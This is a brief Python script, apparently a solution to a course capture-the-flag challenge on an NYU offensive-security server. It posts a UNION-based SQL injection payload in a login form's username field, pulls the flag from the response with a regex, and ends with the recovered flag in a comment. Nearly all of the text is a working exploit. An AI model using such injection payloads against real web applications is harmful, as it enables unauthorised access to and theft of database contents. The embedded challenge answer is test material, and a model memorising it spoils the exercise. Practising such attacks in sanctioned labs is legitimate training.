import re
import requests

url = 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1506'
netid = 'xz4344'
cookies = {"CHALBROKER_USER_ID": netid}

data = {
    'username': "' UNION SELECT 1,1,1,*,1 FROM flag--",
    'password': 'random'
}

print("[*] Performing SQL injection...")
response = requests.post(f'{url}/login', data=data, cookies=cookies)
match = re.search(r"flag\{.*?\}", response.text)
flag = match.group(0)
print(f"[+] Found the flag: {flag}")

# flag{m4nu4l_1nject1on_1s_s0_much_fun_15nt_1t?_c3a006c96a53f1cd}
